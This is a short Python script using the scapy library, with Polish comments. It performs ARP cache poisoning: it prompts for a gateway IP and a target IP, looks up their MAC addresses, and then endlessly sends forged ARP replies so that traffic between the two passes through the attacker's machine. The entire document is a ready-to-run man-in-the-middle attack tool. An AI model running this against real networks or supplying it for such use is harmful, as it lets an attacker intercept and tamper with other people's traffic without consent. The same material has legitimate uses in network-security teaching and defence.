#Na windowsie program prawdopodobnie nie dziala

from scapy.all import *
import scapy.layers.inet

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    while True:
        # wysylamy pakiet do gateway podszywajac sie pod target
        pkt_to_gateway = scapy.layers.l2.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        # wysylamy pakiet do target podszywajac sie pod gateway
        pkt_to_target = scapy.layers.l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

        send(pkt_to_gateway)
        send(pkt_to_target)

def get_mac(ip):
    arp_out = scapy.layers.inet.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.layers.l2.ARP(op=1, pdst=ip)
    ans, unans = srp(arp_out, timeout=5, retry=2, verbose=False)
    for send, receive in ans:
        return receive[scapy.layers.l2.ARP].hwsrc   # adres MAC, ktory odpowiedzial na zapytanie o adres MAC dla danego IP

    return None


gateway_ip = input("Provide gateway IP: ")
target_ip = input("Target IP: ")
gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)

arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)